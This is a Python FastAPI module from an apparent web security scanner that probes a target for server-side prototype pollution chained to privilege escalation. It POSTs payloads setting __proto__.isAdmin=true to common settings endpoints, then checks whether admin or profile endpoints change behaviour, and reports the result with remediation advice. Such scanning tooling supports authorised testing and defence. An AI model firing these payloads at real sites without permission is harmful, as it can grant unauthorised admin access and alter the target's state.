"""proto_pollution_chain — prototype pollution + downstream-sink chain.

Existing prototype_pollution scanner tests Object.prototype mutation via
POST body. This one tests the WHOLE chain: pollute __proto__.isAdmin = true,
then check if subsequent endpoint behavior changes (admin-page access,
extra fields in response).

Two-phase: (1) POST polluting payload to mutation-friendly endpoint,
(2) GET a check-endpoint with same session and look for behavior change.
"""
import json
from fastapi import APIRouter, Depends
from tools._shared import (ScanRequest, verify_scan_quota, web_url,
                            safe_request, wrap_finding, standard_response)
from tools._vl_core.turbo import vl_turbo

router = APIRouter()

POLLUTION_PAYLOADS = [
    {"__proto__": {"isAdmin": True, "polluted": "vulnuslab"}},
    {"constructor": {"prototype": {"polluted": "vulnuslab"}}},
    {"__proto__[isAdmin]": True, "__proto__[polluted]": "vulnuslab"},
]
POST_PATHS = ["/api/user/settings", "/api/settings", "/api/profile",
               "/api/users", "/api/preferences"]
CHECK_PATHS = ["/api/me", "/api/user", "/api/profile",
                "/api/admin/users", "/admin"]


def _post(url, body, req):
    return safe_request("POST", url,
        headers={"Content-Type": "application/json",
                  "User-Agent": "VulnusLab/1.0"},
        data=json.dumps(body), req=req, timeout=8, allow_redirects=False)


def _get(url, req):
    return safe_request("GET", url,
        headers={"User-Agent": "VulnusLab/1.0"},
        req=req, timeout=8, allow_redirects=False)


@router.post("/api/webapp/scan/proto_pollution_chain")
@vl_turbo()
def scan_proto_pollution_chain(req: ScanRequest, payload=Depends(verify_scan_quota)):
    base = web_url(req.target).rstrip("/")

    # Phase 0: baseline of each check path
    baselines = {}
    for p in CHECK_PATHS:
        r = _get(base + p, req)
        if r is None or r.status_code == 404: continue
        baselines[p] = {"status": r.status_code,
                          "body_snippet": (r.text or "")[:1000]}

    if not baselines:
        return standard_response(
            tool="proto_pollution_chain", target=req.target, findings=[],
            tests_performed=len(CHECK_PATHS), vulnerable=False,
            skipped_reason="No check endpoints exist on target")

    chain_hits = []
    post_tested = 0
    for post_path in POST_PATHS:
        post_url = base + post_path
        # Sanity: does POST path exist?
        r_sanity = _get(post_url, req)
        if r_sanity is None or r_sanity.status_code == 404: continue
        post_tested += 1

        for payload_body in POLLUTION_PAYLOADS:
            _post(post_url, payload_body, req)  # ignore result
            # Now re-fetch each check path
            for check_path, base_data in baselines.items():
                r = _get(base + check_path, req)
                if r is None: continue
                # Behavior change signal: status flipped 403→200 OR body now contains "polluted"
                if (r.status_code == 200 and base_data["status"] in (401, 403)) or \
                   ("polluted" in (r.text or "")[:5000]):
                    chain_hits.append({
                        "post_path": post_path,
                        "check_path": check_path,
                        "baseline_status": base_data["status"],
                        "polluted_status": r.status_code,
                        "marker_reflected": "polluted" in (r.text or "")[:5000],
                    })
                    break
            if chain_hits and chain_hits[-1]["post_path"] == post_path:
                break

    findings = []
    if chain_hits:
        findings.append(wrap_finding(
            f"PROTOTYPE POLLUTION CHAIN confirmed at {len(chain_hits)} location(s)",
            "CRITICAL", cvss="9.0", cwe="CWE-1321", owasp="A03:2021",
            remediation="Server-side prototype pollution chain to privilege "
                        "escalation. (1) Use Object.create(null) for parsed JSON "
                        "(no __proto__). (2) lodash >= 4.17.21 (fixed CVE-2020-"
                        "8203). (3) Validate request body with schema (Joi / "
                        "Zod / AJV) that rejects __proto__ + constructor keys. "
                        "(4) Audit all server-side merge / extend / defaultsDeep "
                        "callers — these are the typical sinks.",
            evidence_marker=" | ".join(
                f"POST {c['post_path']} → GET {c['check_path']}: "
                f"{c['baseline_status']} → {c['polluted_status']}"
                f"{' + polluted marker' if c['marker_reflected'] else ''}"
                for c in chain_hits[:3]
            )))
    else:
        findings.append(wrap_finding(
            f"No prototype-pollution chain to privilege escalation detected "
            f"({post_tested} mutation paths × {len(POLLUTION_PAYLOADS)} payloads × "
            f"{len(baselines)} check paths)",
            "POSITIVE", cwe="CWE-1321",
            remediation="Maintain. Continue using object freeze / schema validation.",
            evidence_marker=f"baselines: {list(baselines.keys())[:3]}"))

    return standard_response(
        tool="proto_pollution_chain", target=req.target, findings=findings,
        tests_performed=post_tested * len(POLLUTION_PAYLOADS) * len(baselines),
        vulnerable=bool(chain_hits),
        tests_summary=f"{post_tested} mutation paths, {len(chain_hits)} chains",
        raw_data={"chain_hits": chain_hits, "baselines": baselines})


def register(app):
    app.include_router(router)
